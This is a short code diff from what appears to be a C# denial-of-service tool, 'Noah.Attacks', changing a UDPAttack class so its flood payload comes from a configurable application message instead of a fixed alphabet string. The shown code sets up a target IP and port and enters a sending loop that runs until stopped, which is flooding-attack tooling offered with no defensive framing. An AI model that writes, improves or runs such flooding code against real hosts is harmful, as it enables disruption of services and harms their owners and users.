@@ -12,14 +12,12 @@ namespace Noah.Attacks
     {
         public string AttackName { get; private set; }
 
-        private string message;
         private ApplicationState state;
         private string ip;
         private int port;
 
         public UDPAttack(ApplicationState state, string host, int port = 80)
         {
-            message = "abcdefghijklmnopqrstuvwxyz";
             this.state = state;
             ip = host;
             this.port = port;
@@ -33,7 +31,7 @@ namespace Noah.Attacks
         private void attack()
         {
             state.State = States.Attacking;
-            byte[] bytes = Encoding.ASCII.GetBytes(message);
+            byte[] bytes = Encoding.ASCII.GetBytes(state.Message);
             IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), port);
 
             while (state.State != States.Done)
